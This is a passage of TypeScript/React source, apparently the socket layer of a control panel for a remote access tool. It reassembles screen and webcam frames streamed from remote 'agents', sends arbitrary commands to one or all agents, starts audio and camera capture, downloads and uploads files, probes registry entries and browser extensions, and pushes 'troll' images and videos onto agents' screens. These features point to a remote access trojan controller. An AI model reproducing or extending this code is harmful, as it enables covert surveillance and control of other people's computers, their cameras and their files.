          const raw = data?.agent_id ? localStorage.getItem(`stream:last:${data.agent_id}`) : null;
          const saved = raw ? JSON.parse(raw) : {};
          if (!saved?.screen) return;
        } catch {}
        const base = `${data.agent_id || 'unknown'}:screen`;
        const seq = typeof data?.frame_id === 'number' ? data.frame_id : Number(data?.frame_id || 0);
        if (!latestFrameSeq[base] || seq > latestFrameSeq[base]) latestFrameSeq[base] = seq;
        if (seq < latestFrameSeq[base]) return;
        const key = `${base}:${seq}`;
        const chunk = typeof data?.chunk === 'string' ? data.chunk : '';
        const off = typeof data?.offset === 'number' ? data.offset : Number(data?.offset);
        const total = typeof data?.total_size === 'number' ? data.total_size : Number(data?.total_size);
        if (!streamBuffers[key]) {
          streamBuffers[key] = { chunksByOffset: {}, receivedSize: 0, totalSize: total || 0, startedAt: Date.now(), lastChunkAt: Date.now() };
        }
        if (Number.isFinite(off) && off >= 0 && chunk) {
          if (!streamBuffers[key].chunksByOffset[off]) {
            streamBuffers[key].chunksByOffset[off] = chunk;
            streamBuffers[key].receivedSize += chunk.length;
          }
        }
        if (total) streamBuffers[key].totalSize = total;
        streamBuffers[key].lastChunkAt = Date.now();
        const buf = streamBuffers[key];
        if (buf.totalSize > 0 && buf.receivedSize >= buf.totalSize) {
          const ordered = Object.entries(buf.chunksByOffset).map(([k, v]) => [Number(k), v] as const).sort((a, b) => a[0] - b[0]);
          let base64 = '';
          for (const [, c] of ordered) base64 += c;
          delete streamBuffers[key];
          const event = new CustomEvent('screen_frame', { detail: { agent_id: data.agent_id, frame: base64 } });
          window.dispatchEvent(event);
        } else {
          const age = Date.now() - buf.startedAt;
          if (buf.totalSize > 0 && age > 800) {
            delete streamBuffers[key];
          }
        }
      } catch {}
    });
    
    socketInstance.on('camera_frame_chunk', (data: any) => {
      try {
        try {
          const raw = data?.agent_id ? localStorage.getItem(`stream:last:${data.agent_id}`) : null;
          const saved = raw ? JSON.parse(raw) : {};
          if (!saved?.camera) return;
        } catch {}
        const base = `${data.agent_id || 'unknown'}:camera`;
        const seq = typeof data?.frame_id === 'number' ? data.frame_id : Number(data?.frame_id || 0);
        if (!latestFrameSeq[base] || seq > latestFrameSeq[base]) latestFrameSeq[base] = seq;
        if (seq < latestFrameSeq[base]) return;
        const key = `${base}:${seq}`;
        const chunk = typeof data?.chunk === 'string' ? data.chunk : '';
        const off = typeof data?.offset === 'number' ? data.offset : Number(data?.offset);
        const total = typeof data?.total_size === 'number' ? data.total_size : Number(data?.total_size);
        if (!streamBuffers[key]) {
          streamBuffers[key] = { chunksByOffset: {}, receivedSize: 0, totalSize: total || 0, startedAt: Date.now(), lastChunkAt: Date.now() };
        }
        if (Number.isFinite(off) && off >= 0 && chunk) {
          if (!streamBuffers[key].chunksByOffset[off]) {
            streamBuffers[key].chunksByOffset[off] = chunk;
            streamBuffers[key].receivedSize += chunk.length;
          }
        }
        if (total) streamBuffers[key].totalSize = total;
        streamBuffers[key].lastChunkAt = Date.now();
        const buf = streamBuffers[key];
        if (buf.totalSize > 0 && buf.receivedSize >= buf.totalSize) {
          const ordered = Object.entries(buf.chunksByOffset).map(([k, v]) => [Number(k), v] as const).sort((a, b) => a[0] - b[0]);
          let base64 = '';
          for (const [, c] of ordered) base64 += c;
          delete streamBuffers[key];
          const event = new CustomEvent('camera_frame', { detail: { agent_id: data.agent_id, frame: base64 } });
          window.dispatchEvent(event);
        } else {
          const age = Date.now() - buf.startedAt;
          if (buf.totalSize > 0 && age > 800) {
            delete streamBuffers[key];
          }
        }
      } catch {}
    });
    
    socketInstance.on('screen_frame_bin_chunk', (data: any) => {
      try {
        try {
          const raw = data?.agent_id ? localStorage.getItem(`stream:last:${data.agent_id}`) : null;
          const saved = raw ? JSON.parse(raw) : {};
          if (!saved?.screen) return;
        } catch {}
        const base = `${data.agent_id || 'unknown'}:screen`;
        const seq = typeof data?.frame_id === 'number' ? data.frame_id : Number(data?.frame_id || 0);
        if (!latestFrameSeq[base] || seq > latestFrameSeq[base]) latestFrameSeq[base] = seq;
        if (seq < latestFrameSeq[base]) return;
        const key = `${base}:${seq}:bin`;
        const chunkAny = data?.chunk as any;
        const off = typeof data?.offset === 'number' ? data.offset : Number(data?.offset);
        const total = typeof data?.total_size === 'number' ? data.total_size : Number(data?.total_size);
        if (!binStreamBuffers[key]) {
          binStreamBuffers[key] = { chunksByOffset: {}, receivedSize: 0, totalSize: total || 0, startedAt: Date.now(), lastChunkAt: Date.now() };
        }
        let bytes: Uint8Array | null = null;
        if (chunkAny instanceof Uint8Array) bytes = chunkAny;
        else if (chunkAny && typeof chunkAny === 'object' && 'byteLength' in chunkAny) bytes = new Uint8Array(chunkAny);
        else if (Array.isArray(chunkAny)) bytes = new Uint8Array(chunkAny as number[]);
        if (bytes && Number.isFinite(off) && off >= 0) {
          if (!binStreamBuffers[key].chunksByOffset[off]) {
            binStreamBuffers[key].chunksByOffset[off] = bytes;
            binStreamBuffers[key].receivedSize += bytes.length;
          }
        }
        if (total) binStreamBuffers[key].totalSize = total;
        binStreamBuffers[key].lastChunkAt = Date.now();
        const buf = binStreamBuffers[key];
        if (buf.totalSize > 0 && buf.receivedSize >= buf.totalSize) {
          const ordered = Object.entries(buf.chunksByOffset).map(([k, v]) => [Number(k), v] as const).sort((a, b) => a[0] - b[0]);
          const combined = new Uint8Array(buf.totalSize);
          let cursor = 0;
          for (const [, c] of ordered) {
            combined.set(c, cursor);
            cursor += c.length;
          }
          delete binStreamBuffers[key];
          const event = new CustomEvent('screen_frame', { detail: { agent_id: data.agent_id, frame: combined } });
          window.dispatchEvent(event);
        } else {
          const age = Date.now() - buf.startedAt;
          if (buf.totalSize > 0 && age > 800) {
            delete binStreamBuffers[key];
          }
        }
      } catch {}
    });
    
    socketInstance.on('camera_frame_bin_chunk', (data: any) => {
      try {
        try {
          const raw = data?.agent_id ? localStorage.getItem(`stream:last:${data.agent_id}`) : null;
          const saved = raw ? JSON.parse(raw) : {};
          if (!saved?.camera) return;
        } catch {}
        const base = `${data.agent_id || 'unknown'}:camera`;
        const seq = typeof data?.frame_id === 'number' ? data.frame_id : Number(data?.frame_id || 0);
        if (!latestFrameSeq[base] || seq > latestFrameSeq[base]) latestFrameSeq[base] = seq;
        if (seq < latestFrameSeq[base]) return;
        const key = `${base}:${seq}:bin`;
        const chunkAny = data?.chunk as any;
        const off = typeof data?.offset === 'number' ? data.offset : Number(data?.offset);
        const total = typeof data?.total_size === 'number' ? data.total_size : Number(data?.total_size);
        if (!binStreamBuffers[key]) {
          binStreamBuffers[key] = { chunksByOffset: {}, receivedSize: 0, totalSize: total || 0, startedAt: Date.now(), lastChunkAt: Date.now() };
        }
        let bytes: Uint8Array | null = null;
        if (chunkAny instanceof Uint8Array) bytes = chunkAny;
        else if (chunkAny && typeof chunkAny === 'object' && 'byteLength' in chunkAny) bytes = new Uint8Array(chunkAny);
        else if (Array.isArray(chunkAny)) bytes = new Uint8Array(chunkAny as number[]);
        if (bytes && Number.isFinite(off) && off >= 0) {
          if (!binStreamBuffers[key].chunksByOffset[off]) {
            binStreamBuffers[key].chunksByOffset[off] = bytes;
            binStreamBuffers[key].receivedSize += bytes.length;
          }
        }
        if (total) binStreamBuffers[key].totalSize = total;
        binStreamBuffers[key].lastChunkAt = Date.now();
        const buf = binStreamBuffers[key];
        if (buf.totalSize > 0 && buf.receivedSize >= buf.totalSize) {
          const ordered = Object.entries(buf.chunksByOffset).map(([k, v]) => [Number(k), v] as const).sort((a, b) => a[0] - b[0]);
          const combined = new Uint8Array(buf.totalSize);
          let cursor = 0;
          for (const [, c] of ordered) {
            combined.set(c, cursor);
            cursor += c.length;
          }
          delete binStreamBuffers[key];
          const event = new CustomEvent('camera_frame', { detail: { agent_id: data.agent_id, frame: combined } });
          window.dispatchEvent(event);
        } else {
          const age = Date.now() - buf.startedAt;
          if (buf.totalSize > 0 && age > 800) {
            delete binStreamBuffers[key];
          }
        }
      } catch {}
    });
    
    socketInstance.on('file_download_chunk', (data: any) => {
      console.log('📥 Received file_download_chunk:', data);
      const fileKey = data?.download_id || data?.filename;
      
      if (data.error) {
        console.error(`Download error: ${data.error}`);
        addCommandOutput(`Download failed: ${data.error}`);
        if (fileKey) delete downloadBuffers[fileKey];
        return;
      }

      const chunkBase64 = extractBase64Payload(data?.chunk ?? data?.data ?? data?.chunk_data);
      if (!chunkBase64) {
        addCommandOutput(`Download failed: Missing chunk data for ${data?.filename || 'unknown file'}`);
        if (fileKey) delete downloadBuffers[fileKey];
        return;
      }

      // Initialize buffer for this file
      if (fileKey && !downloadBuffers[fileKey]) {
        downloadBuffers[fileKey] = { chunksByOffset: {}, receivedSize: 0, totalSize: data.total_size || 0 };
        console.log(`📥 Starting download: ${data.filename} (${data.total_size} bytes)`);
        addCommandOutput(`📥 Downloading: ${data.filename} (${data.total_size} bytes)`);
      }
      
      // Decode base64 chunk
      const binaryString = atob(chunkBase64);
      const bytes = new Uint8Array(binaryString.length);
      for (let i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
      }
      if (fileKey) {
        const buf = downloadBuffers[fileKey];
        const chunkOffset = typeof data?.offset === 'number' ? data.offset : Number(data?.offset);
        if (Number.isFinite(chunkOffset) && chunkOffset >= 0) {
          if (!buf.chunksByOffset[chunkOffset]) {
            buf.chunksByOffset[chunkOffset] = bytes;
            buf.receivedSize += bytes.length;
          }
        }
      }
      
      // Calculate progress
      const totalSize = fileKey ? (data.total_size || downloadBuffers[fileKey].totalSize || 0) : (data.total_size || 0);
      if (fileKey && data.total_size) downloadBuffers[fileKey].totalSize = data.total_size;
      const receivedSize = fileKey ? downloadBuffers[fileKey].receivedSize : 0;
      const progress = totalSize > 0 ? Math.round((receivedSize / totalSize) * 100) : 0;
      console.log(`📊 Download progress: ${data.filename} - ${progress}%`);

      if (data?.download_id && String(data.download_id).startsWith('preview_')) {
        const event = new CustomEvent('file_download_progress', { detail: { ...data, progress } });
        window.dispatchEvent(event);
      }
      
      // Check if download is complete
      if (totalSize > 0 && receivedSize >= totalSize) {
        console.log(`✅ Download complete: ${data.filename}`);
        
        // Combine all chunks into one Uint8Array (exact total_size, exact offsets)
        let combinedArray = new Uint8Array(totalSize);
        if (fileKey) {
          const entries = Object.entries(downloadBuffers[fileKey].chunksByOffset)
            .map(([k, v]) => [Number(k), v] as const)
            .sort((a, b) => a[0] - b[0]);
          for (const [off, chunk] of entries) {
            if (!Number.isFinite(off) || off < 0) continue;
            if (off >= combinedArray.length) continue;
            const remaining = combinedArray.length - off;
            if (chunk.length <= remaining) {
              combinedArray.set(chunk, off);
            } else {
              combinedArray.set(chunk.subarray(0, remaining), off);
            }
          }
        }
        
        const filename = String(data?.filename || 'download');
        const mime = detectMimeFromBytes(combinedArray, filename);
        if (data?.download_id && String(data.download_id).startsWith('preview_')) {
          const chunkB64 = bytesToBase64(combinedArray);
          const event = new CustomEvent('file_preview_ready', { detail: { ...data, chunk: chunkB64, mime, filename } });
          window.dispatchEvent(event);
        } else {
          const blob = new Blob([combinedArray], { type: mime });
          const url = URL.createObjectURL(blob);
          const a = document.createElement('a');
          a.href = url;
          a.download = filename;
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
          URL.revokeObjectURL(url);
        }
        
        // Clean up
        if (fileKey) delete downloadBuffers[fileKey];
        addCommandOutput(`✅ Downloaded: ${data.filename} (${combinedArray.length} bytes)`);
      }
      
      // Also dispatch custom event for FileManager component
      const event = new CustomEvent('file_download_chunk', { detail: data });
      window.dispatchEvent(event);
    });
    
    // Upload progress events (with slide notifications)
    const lastProgress: Record<string, number> = {};
    socketInstance.on('file_upload_progress', (data: any) => {
      try {
        if (Array.isArray(data) && data.length > 0) data = data[0];
      } catch {}
      console.log(`📊 Upload progress (from agent): ${data?.filename} - ${data?.progress}%`);
      const event = new CustomEvent('file_upload_progress', { detail: { ...(Array.isArray(data) ? (data[0] || {}) : (data || {})), source: (Array.isArray(data) ? (data[0]?.source) : data?.source) || 'agent' } });
      window.dispatchEvent(event);
      try {
        const key = `${data?.agent_id || ''}:${data?.upload_id || data?.filename || ''}`;
        const p = Number(data?.progress ?? -1);
        if (Number.isFinite(p)) {
          const last = lastProgress[key] ?? -1;
          if (p !== last && (p === 0 || p === 100 || p % 25 === 0)) {
            toast.info(`Upload ${data?.filename || ''}: ${p}%`);
            lastProgress[key] = p;
          }
        } else {
          toast.info(`Upload progress: ${data?.filename || ''}`);
        }
      } catch {}
    });
    
    socketInstance.on('file_upload_complete', (data: any) => {
      try {
        if (Array.isArray(data) && data.length > 0) data = data[0];
      } catch {}
      console.log(`✅ Upload complete (from agent): ${data?.filename} (${data?.size} bytes)`);
      addCommandOutput(`✅ Uploaded: ${data?.filename} (${data?.size} bytes)`);
      const event = new CustomEvent('file_upload_complete', { detail: { ...(Array.isArray(data) ? (data[0] || {}) : (data || {})), source: (Array.isArray(data) ? (data[0]?.source) : data?.source) || 'agent' } });
      window.dispatchEvent(event);
      try {
        const src = String(data?.source || 'agent');
        if (src === 'agent') {
          const dst = String(data?.destination_path || '');
          toast.success(`Upload complete: ${data?.filename || ''}`, { description: dst ? `Saved to ${dst}` : undefined, duration: 5000 });
        }
      } catch {}
    });
    socketInstance.on('file_upload_debug', (data: any) => {
      console.log('🧪 Upload debug:', data);
      const event = new CustomEvent('file_upload_debug', { detail: data });
      window.dispatchEvent(event);
      try {
        const stage = String(data?.stage || '');
        if (stage === 'start') {
          toast.info(`Upload start: ${data?.filename || ''}`, { description: `Dest: ${data?.destination || ''}, Size: ${data?.total_size || ''}` });
        } else if (stage === 'chunk') {
          const p = Number(data?.received ?? 0);
          const desc = `off=${data?.offset ?? 0}, len=${data?.len ?? 0}, recv=${p}`;
          toast.info(`Chunk: ${data?.upload_id || ''}`, { description: desc });
        } else if (stage === 'complete_recv') {
          toast.info(`Complete recv: ${data?.upload_id || ''}`, { description: `received=${data?.received}, total=${data?.total}` });
        } else if (stage === 'commit') {
          const ok = Boolean(data?.ok);
          const msg = ok ? `Committed: ${data?.target_path || ''}` : `Commit failed: ${data?.error || 'unknown'}`;
          if (ok) toast.success(msg); else toast.error(msg);
        }
      } catch {}
    });
    
    // Download progress events
    socketInstance.on('file_download_progress', (data: any) => {
      console.log(`📊 Download progress: ${data.filename} - ${data.progress}%`);
      const event = new CustomEvent('file_download_progress', { detail: data });
      window.dispatchEvent(event);
    });
    
    socketInstance.on('file_download_complete', (data: any) => {
      console.log(`✅ Download complete: ${data.filename} (${data.size} bytes)`);
      const event = new CustomEvent('file_download_complete', { detail: data });
      window.dispatchEvent(event);
    });

    // WebRTC events
    socketInstance.on('webrtc_stats', (data: any) => {
      console.log('WebRTC Stats:', data);
    });

    socketInstance.on('webrtc_error', (data: { message: string }) => {
      console.error('WebRTC Error:', data.message);
      addCommandOutput(`WebRTC Error: ${data.message}`);
      try { toast.error(`WebRTC error: ${data.message}`); } catch {}
    });

    return () => {
      socketInstance.disconnect();
    };
  }, [addCommandOutput]);

  // Check authentication status on mount
  useEffect(() => {
    const checkAuthStatus = async () => {
      try {
        const response = await apiClient.checkAuthStatus();
        if (response.success && response.data?.authenticated) {
          setAuthenticated(true);
        } else {
          setAuthenticated(false);
        }
      } catch (error) {
        console.error('Failed to check auth status:', error);
        setAuthenticated(false);
      }
    };

    checkAuthStatus();
  }, []);

  // Global handler: show popup when backend requires authentication
  useEffect(() => {
    const onAuthRequired = (e: CustomEvent<any> | Event) => {
      try {
        const detail: any = (e as any).detail || {};
        try {
          const w: any = window as any;
          const supTs = Number(w.__NCH_SUPPRESS_AUTH_REDIRECT__ || 0);
          if (supTs && (Date.now() - supTs) < 3000) {
            return;
          }
        } catch {}
        const n: Notification = {
          id: `auth_${Date.now()}`,
          type: 'warning',
          title: 'Authentication Required',
          message: 'Please log in to continue.',
          timestamp: new Date(),
          read: false,
          category: 'system',
        };
        setNotifications(prev => [...prev.slice(-99), n]);
        setAuthenticated(false);
        try { toast.error('Authentication required. Please log in.', { duration: 7000 }); } catch {}
        try {
          const w: any = window as any;
          if (window.location.pathname !== '/login' && !w.__NCH_REDIRECTING__) {
            w.__NCH_REDIRECTING__ = true;
            setTimeout(() => {
              try { window.location.replace('/login'); } catch {}
            }, 10);
          }
        } catch {}
      } catch (err) {
      }
    };
    window.addEventListener('auth_required', onAuthRequired as any);
    return () => {
      window.removeEventListener('auth_required', onAuthRequired as any);
    };
  }, []);

  // Global handler: show popup for any API error responses
  useEffect(() => {
    const onApiError = (e: CustomEvent<any> | Event) => {
      try {
        const detail: any = (e as any).detail || {};
        const endpoint = String(detail?.endpoint || '');
        if (endpoint === '/api/auth/login') {
          return;
        }
        const msg = detail?.message || detail?.error || 'Request failed';
        toast.error(typeof msg === 'string' ? msg : 'Request failed', { duration: 5000 });
      } catch {}
    };
    window.addEventListener('api_error', onApiError as any);
    return () => {
      window.removeEventListener('api_error', onApiError as any);
    };
  }, []);

  const sendCommand = useCallback((agentId: string | 'ALL', command: string) => {
    console.log('🔍 SocketProvider: sendCommand called:', { agentId, command, socket: !!socket, connected });
    
    if (!socket || !connected) {
      console.error('🔍 SocketProvider: Not connected to server');
      addCommandOutput(`Error: Not connected to server`);
      try { toast.error('Not connected to server'); } catch {}
      return;
    }
    
    if (!command.trim()) {
      console.error('🔍 SocketProvider: Invalid command');
      addCommandOutput(`Error: Invalid command`);
      try { toast.error('Invalid command'); } catch {}
      return;
    }

    try {
      const base = command.includes(':') ? command.split(':')[0] : command;
      const now = Date.now();

      if (agentId === 'ALL') {
        const key = `ALL:${base}`;
        const last = lastEmitRef.current[key] || 0;
        if (now - last < 300) {
          return;
        }
        lastEmitRef.current[key] = now;
        const ids = agents.filter(a => a.status === 'online').map(a => a.id);
        const payload = { command, agent_ids: ids };
        console.log('🔍 SocketProvider: Emitting execute_command_all:', payload);
        socket.emit('execute_command_all', payload);
        return;
      }

      if (!agentId) {
        console.error('🔍 SocketProvider: Invalid agent ID');
        addCommandOutput(`Error: Invalid agent ID`);
        try { toast.error('Invalid agent ID'); } catch {}
        return;
      }
      
      const key = `${agentId}:${base}`;
      const last = lastEmitRef.current[key] || 0;
      if (now - last < 300) {
        return;
      }
      lastEmitRef.current[key] = now;
      const commandData = { agent_id: agentId, command };
      console.log('🔍 SocketProvider: Emitting execute_command:', commandData);
      socket.emit('execute_command', commandData);
      console.log('🔍 SocketProvider: Command sent successfully');
    } catch (error) {
      console.error('🔍 SocketProvider: Error sending command:', error);
      addCommandOutput(`Error: Failed to send command`);
      try { toast.error('Failed to send command'); } catch {}
    }
  }, [socket, connected, addCommandOutput, agents]);

  const checkRegistryPresence = useCallback((agentId: string, items: Array<{ id: string; hive: string; path: string; key: string }>) => {
    try {
      if (!socket || !connected || !agentId) return;
      const payload = JSON.stringify(items || []);
      const k = `${agentId}:registry:check`;
      const now = Date.now();
      const last = lastEmitRef.current[k] || 0;
      if (now - last < 1000) return;
      lastEmitRef.current[k] = now;
      socket.emit('execute_command', { agent_id: agentId, command: `check-registry:${payload}` });
      addCommandOutput(`Requested registry presence check for ${agentId}`);
    } catch (e) {}
  }, [socket, connected, addCommandOutput]);

  const checkExtensionStatus = useCallback((agentId: string) => {
    try {
      if (!socket || !connected || !agentId) return;
      const k = `${agentId}:extension:status`;
      const now = Date.now();
      const last = lastEmitRef.current[k] || 0;
      if (now - last < 800) return;
      lastEmitRef.current[k] = now;
      socket.emit('execute_command', { agent_id: agentId, command: 'check-extension-status' });
      addCommandOutput(`Requested extension status for ${agentId}`);
    } catch (e) {}
  }, [socket, connected, addCommandOutput]);

  const startStream = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio') => {
    if (socket && connected) {
      let command = '';
      switch (type) {
        case 'screen':
          command = 'start-stream';
          break;
        case 'camera':
          command = 'start-camera';
          break;
        case 'audio':
          command = 'start-audio';
          break;
      }
      const k = `${agentId}:stream:${type}:start`;
      const now = Date.now();
      const last = lastEmitRef.current[k] || 0;
      if (now - last < 800) {
        return;
      }
      lastEmitRef.current[k] = now;
      socket.emit('execute_command', { agent_id: agentId, command });
      addCommandOutput(`Starting ${type} stream for ${agentId}`);
      setLastActivity(`stream:${type}`, `started`, agentId);
      markStreamActive(agentId);
      try {
        const key = `stream:last:${agentId}`;
        const raw = localStorage.getItem(key);
        const prev = raw ? JSON.parse(raw) : {};
        localStorage.setItem(key, JSON.stringify({ ...prev, [type]: true }));
      } catch {}
    }
  }, [socket, connected, addCommandOutput, setLastActivity]);

  const stopStream = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio') => {
    if (socket && connected) {
      let command = '';
      switch (type) {
        case 'screen':
          command = 'stop-stream';
          break;
        case 'camera':
          command = 'stop-camera';
          break;
        case 'audio':
          command = 'stop-audio';
          break;
      }
      const k = `${agentId}:stream:${type}:stop`;
      const now = Date.now();
      const last = lastEmitRef.current[k] || 0;
      if (now - last < 800) {
        return;
      }
      lastEmitRef.current[k] = now;
      socket.emit('execute_command', { agent_id: agentId, command });
      addCommandOutput(`Stopping ${type} stream for ${agentId}`);
      setLastActivity(`stream:${type}`, `stopped`, agentId);
      try {
        delete streamsActiveRef.current[agentId];
        const nowTs = Date.now();
        const count = Object.values(streamsActiveRef.current).filter(ts => nowTs - ts < 15000).length;
        setStreamsActiveCount(count);
      } catch {}
      try {
        const key = `stream:last:${agentId}`;
        const raw = localStorage.getItem(key);
        const prev = raw ? JSON.parse(raw) : {};
        localStorage.setItem(key, JSON.stringify({ ...prev, [type]: false }));
      } catch {}
    }
  }, [socket, connected, addCommandOutput]);

  const sendBatch = useCallback((commands: Array<{ agent_id: string | 'ALL'; command: string }>) => {
    if (!socket || !connected) return;
    try {
      const payload = { commands };
      socket.emit('execute_batch', payload);
      addCommandOutput(`Batch dispatched: ${commands.length} item(s)`);
    } catch (e) {
      try { toast.error('Failed to dispatch batch'); } catch {}
    }
  }, [socket, connected, addCommandOutput]);

  const startStreamsAll = useCallback((types: Array<'screen'|'camera'|'audio'>, agentIds?: string[] | null) => {
    if (!socket || !connected) return;
    const ids = (agentIds && agentIds.length ? agentIds : agents.filter(a => a.status === 'online').map(a => a.id));
    const cmds: Array<{ agent_id: string, command: string }> = [];
    for (const id of ids) {
      for (const t of types) {
        cmds.push({ agent_id: id, command: t === 'screen' ? 'start-stream' : t === 'camera' ? 'start-camera' : 'start-audio' });
      }
    }
    sendBatch(cmds);
  }, [socket, connected, agents, sendBatch]);

  const stopStreamsAll = useCallback((types: Array<'screen'|'camera'|'audio'>, agentIds?: string[] | null) => {
    if (!socket || !connected) return;
    const ids = (agentIds && agentIds.length ? agentIds : agents.filter(a => a.status === 'online').map(a => a.id));
    const cmds: Array<{ agent_id: string, command: string }> = [];
    for (const id of ids) {
      for (const t of types) {
        cmds.push({ agent_id: id, command: t === 'screen' ? 'stop-stream' : t === 'camera' ? 'stop-camera' : 'stop-audio' });
      }
    }
    sendBatch(cmds);
  }, [socket, connected, agents, sendBatch]);

  const startDualStreams = useCallback((agentId: string) => {
    if (!socket || !connected || !agentId) return;
    sendBatch([
      { agent_id: agentId, command: 'start-stream' },
      { agent_id: agentId, command: 'start-camera' },
    ]);
    setLastActivity('stream:dual', 'started', agentId);
  }, [socket, connected, sendBatch, setLastActivity]);

  const stopDualStreams = useCallback((agentId: string) => {
    if (!socket || !connected || !agentId) return;
    sendBatch([
      { agent_id: agentId, command: 'stop-stream' },
      { agent_id: agentId, command: 'stop-camera' },
    ]);
    setLastActivity('stream:dual', 'stopped', agentId);
  }, [socket, connected, sendBatch, setLastActivity]);

  const uploadFile = useCallback((agentId: string, file: File, destinationPath: string) => {
    if (!socket || !connected) return;
    const destinationFilePath = normalizeDestinationPath(destinationPath, file.name);
    const destinationDir = extractDirectoryFromPath(destinationFilePath);
    const displayPath = destinationDir
      ? (destinationDir.endsWith('\\') || destinationDir.endsWith('/') ? `${destinationDir}${file.name}` : `${destinationDir}${destinationDir.includes('\\') ? '\\' : '/'}${file.name}`)
      : file.name;
    addCommandOutput(`Uploading ${file.name} (${file.size} bytes) to ${agentId}:${displayPath || '(default)'}`);
    (async () => {
      try {
        const resp = await apiClient.uploadFilePowerShell(agentId, file, destinationDir || '', socket?.id || '');
        if (!resp?.success) {
          throw new Error(resp?.error || resp?.message || 'Upload request failed');
        }
      } catch (e: any) {
        addCommandOutput(`Upload failed: ${e?.message || String(e)}`);
        try { toast.error(`Upload failed: ${e?.message || 'Unknown error'}`); } catch {}
        // Dispatch a failure event to allow UI to reset progress without page refresh
        try {
          const event = new CustomEvent('file_upload_complete', { detail: { agent_id: agentId, filename: file.name, destination_path: displayPath, success: false, error: e?.message || String(e), source: 'client' } });
          window.dispatchEvent(event);
        } catch {}
      }
    })();
  }, [socket, connected, addCommandOutput]);

  const downloadFile = useCallback((agentId: string, filename: string) => {
    if (socket && connected) {
      const downloadId = `dl_${Date.now()}_${Math.random().toString(16).slice(2)}`;
      socket.emit('download_file', {
        agent_id: agentId,
        filename: filename,
        download_id: downloadId
      });
      addCommandOutput(`Downloading ${filename} from ${agentId}`);
    }
  }, [socket, connected, addCommandOutput]);

  const trollShowImage = useCallback(async (agentId: string | null, file: File, opts?: { duration_ms?: number; mode?: 'cover' | 'contain' | 'fill' }) => {
    if (!socket || !connected) return;
    const buffer = await file.arrayBuffer();
    const bytes = new Uint8Array(buffer);
    const b64 = bytesToBase64(bytes);
    const mime = detectMimeFromBytes(bytes, file.name);
    const payload: any = {
      filename: file.name,
      mime,
      image_b64: b64,
      duration_ms: typeof opts?.duration_ms === 'number' ? opts?.duration_ms : 5000,
      mode: opts?.mode || 'cover'
    };
    if (agentId) payload.agent_id = agentId;
    socket.emit('troll_show_image', payload);
    addCommandOutput(`Troll image sent: ${file.name}${agentId ? ` → ${agentId}` : ' → ALL'}`);
  }, [socket, connected, addCommandOutput]);

  const trollShowVideo = useCallback(async (agentId: string | null, file: File, opts?: { duration_ms?: number }) => {
    if (!socket || !connected) return;
    const buffer = await file.arrayBuffer();
    const bytes = new Uint8Array(buffer);
    const b64 = bytesToBase64(bytes);
    const mime = detectMimeFromBytes(bytes, file.name);
    const payload: any = {
      filename: file.name,
      mime,
      video_b64: b64,
      duration_ms: typeof opts?.duration_ms === 'number' ? opts?.duration_ms : 8000,
    };
    if (agentId) payload.agent_id = agentId;
    socket.emit('troll_show_video', payload);
    addCommandOutput(`Troll video sent: ${file.name}${agentId ? ` → ${agentId}` : ' → ALL'}`);
  }, [socket, connected, addCommandOutput]);

  const previewFile = useCallback((agentId: string, filename: string) => {
    if (socket && connected) {
      const downloadId = `preview_${Date.now()}_${Math.random().toString(16).slice(2)}`;
      socket.emit('download_file', {
        agent_id: agentId,
        filename,
        download_id: downloadId,
        path: filename
      });
      addCommandOutput(`Previewing ${filename} from ${agentId}`);
    }
  }, [socket, connected, addCommandOutput]);

  const login = useCallback(async (password: string, otp?: string): Promise<{ success?: boolean; data?: any; error?: string }> => {
    try {
      const response = await apiClient.login(password, otp);
      if (response.success) {
        setAuthenticated(true);
        try { (window as any).__NCH_SUPPRESS_AUTH_REDIRECT__ = Date.now(); } catch {}
        try { window.location.replace('/dashboard'); } catch {}
        return response;
      }
      setAuthenticated(false);
      return response;
    } catch (error) {
      console.error('Login failed:', error);
      return { success: false, error: 'Network error' };
    }
  }, []);

  const logout = useCallback(async (): Promise<void> => {
    try {
      await apiClient.logout();
    } catch (error) {
      console.error('Backend logout failed (continuing):', error);
    }
    try {
      if (socket) {
        socket.disconnect();
      }
    } catch (e) {
      console.warn('Socket disconnect error:', e);
    }
    setAgents([]);
    setSelectedAgent(null);
    setConnected(false);
    setAuthenticated(false);
    clearCommandOutput();
    try {
      const keysToRemove: string[] = [];
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i) || '';
        if (k.startsWith('fm:lastPath:') || k.startsWith('stream:last:') || k === 'nch:lastActivity') {
          keysToRemove.push(k);
        }
      }
      keysToRemove.forEach(k => localStorage.removeItem(k));
    } catch {}
    try {
      // Redirect to login page (server-rendered)
      window.location.href = '/login';
    } catch {}
  }, [socket, connected, addCommandOutput]);

  const requestSystemInfo = useCallback((detailLevel: 'basic' | 'standard' | 'full' = 'full') => {
    if (!socket || !connected || !selectedAgent) return;
    socket.emit('get_system_info', { agent_id: selectedAgent, detail_level: detailLevel });
  }, [socket, connected, selectedAgent]);

  const requestNetworkInfo = useCallback(() => {
    if (!socket || !connected || !selectedAgent) return;
    socket.emit('get_network_info', { agent_id: selectedAgent });
  }, [socket, connected, selectedAgent]);

  const requestInstalledSoftware = useCallback(() => {
    if (!socket || !connected || !selectedAgent) return;
    socket.emit('get_installed_software', { agent_id: selectedAgent });
  }, [socket, connected, selectedAgent]);

  const value: SocketContextType = {
    socket,
    connected,
    authenticated,
    agents,
    selectedAgent,
    setSelectedAgent,
    lastActivity,
    setLastActivity,
    sendCommand,
    startStream,
    stopStream,
    sendBatch,
    startStreamsAll,
    stopStreamsAll,
    startDualStreams,
    stopDualStreams,
    uploadFile,
    downloadFile,
    previewFile,
    trollShowImage,
    trollShowVideo,
    commandOutput,
    addCommandOutput,
    clearCommandOutput,
    login,
    logout,
    agentMetrics,
    streamsActiveCount,
    commandsExecutedCount,
    agentConfig,
    notifications,
    registryPresence,
    checkRegistryPresence,
    extensionStatus,
    checkExtensionStatus,
    requestSystemInfo,
    requestNetworkInfo,
    requestInstalledSoftware,
    systemInfo,
    networkInfo,
    installedSoftware,
    lastProcessOperation,
    lastProcessDetails,
    getLastFilePath,
    setLastFilePath,
  };

  return (
    <SocketContext.Provider value={value}>
      {children}
    </SocketContext.Provider>
  );
}

export function useSocket() {
  const context = useContext(SocketContext);
  if (!context) {
    throw new Error('useSocket must be used within a SocketProvider');
  }
  return context;
}
